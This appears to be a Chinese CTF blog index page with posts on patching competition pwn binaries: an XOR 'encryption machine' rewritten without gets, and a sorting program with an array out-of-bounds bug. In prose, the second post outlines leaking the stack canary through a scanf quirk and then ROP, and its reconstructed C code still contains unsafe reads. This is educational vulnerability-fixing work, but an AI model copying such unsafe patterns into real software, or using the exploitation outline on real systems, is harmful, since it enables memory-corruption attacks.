class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">begin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Encrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Decrypt"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Input your choice!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">48</span>];</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Input your Plaintext to be encrypted"</span>);</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">strlen</span>(s) &gt; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)x )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( s[x] &lt;= <span class="number">96</span> || s[x] &gt; <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( s[x] &lt;= <span class="number">64</span> || s[x] &gt; <span class="number">90</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(s[x] &gt; <span class="number">47</span> &amp;&amp; s[x] &lt;= <span class="number">57</span>)</span><br><span class="line">                    s[x] ^= <span class="number">0xf</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                s[x] ^= <span class="number">14</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            s[x] ^= <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++x;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="number">47</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Ciphertext"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> input;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE                            hh      iii                "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"===================================================================="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to this Encryption machine\n"</span>);</span><br><span class="line">    begin();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            fflush(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;input);</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="keyword">if</span>(input != <span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"I think you can do it by yourself"</span>);</span><br><span class="line">            begin();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( input != <span class="number">1</span>  )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        encrypt();</span><br><span class="line">        begin();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Something Wrong!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>手写了一遍代码，将gets危险函数替换掉了，其余没什么问题，这个比赛真心好，不让百度。。。。我很多函数都不会，没法查。。后面只能放弃。。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn02-patch/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn02-patch/" class="post-title-link" itemprop="url">国赛pwn修复2</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:34:21" itemprop="dateModified" datetime="2019-10-30T17:34:21+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E6%A0%88/" itemprop="url" rel="index">
                    <span itemprop="name">栈</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="题目修复部分"><a href="#题目修复部分" class="headerlink" title="题目修复部分"></a>题目修复部分</h1><p>题目的点很容易看出，数组越界，不过如何利用这个比较难，我经过一段时间测试，发觉scanf的特性，输入-可以绕过，所以可以泄露cannary，泄露cannary过后可以任意写，然后精确覆盖到cannary过后进行ROP就行了，还有一个点就是输入长度为27的时候，他不会进行排序，这样才能ROP，不过最终我没利用成功，还有一个栈的偏移点我还没搞懂，所以最终也没打出来</p>
<p>修复建议:在读和写的时候都限制数组长度，还有排序的时候考虑长度为27的</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> <span class="keyword">void</span> *a2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(*(<span class="keyword">int</span> *)a1 - *(<span class="keyword">int</span> *)a2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> v2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">78</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodbye~~~"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">64</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer two questions!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1+1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please answer the question1:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1*1999=??\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please answer the question2:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;v1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">94</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right~\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my girlfriend,today is very interesting!!! "</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"nice to meet you!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"here is a pole! \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your name:"</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello my destiny!\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-4Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> k; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> base[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">999</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"how many girlfriends do you have?"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"please input your %dth girlfriends:"</span>, i);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">999</span> )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the sort result:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d  "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)base[j]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you can change your girlfriend"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">    v8 = v2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"which girlfriend do you want to change?"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v2 &gt; <span class="number">10</span> || v2 &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v2; ++k )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"now change:"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;base[k]);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">79</span> &amp;&amp; v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> &amp;&amp; v2 &gt; <span class="number">80</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">64</span> &amp;&amp; v2 &gt; <span class="number">55</span> )</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">100</span> )</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= <span class="number">27</span> || v2 &gt; <span class="number">39</span> )</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">26</span> )</span><br><span class="line"></span><br><span class="line">                qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">                qsort(base,v2,<span class="number">4u</span>LL,cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        qsort(base, v2, <span class="number">4u</span>LL, cmp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//sub2();</span></span><br><span class="line"></span><br><span class="line">    sub1();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/pwn-heap-learn-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/pwn-heap-learn-4/" class="post-title-link" itemprop="url">pwn堆入门系列教程4</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:28:53" itemprop="dateModified" datetime="2019-10-30T17:28:53+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E5%A0%86/" itemprop="url" rel="index">
                    <span itemprop="name">堆</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwn堆入门系列教程4"><a href="#pwn堆入门系列教程4" class="headerlink" title="pwn堆入门系列教程4"></a>pwn堆入门系列教程4</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn堆入门系列教程2</a><br><a href="https://xz.aliyun.com/t/6252" target="_blank" rel="noopener">pwn堆入门系列教程3</a></p>
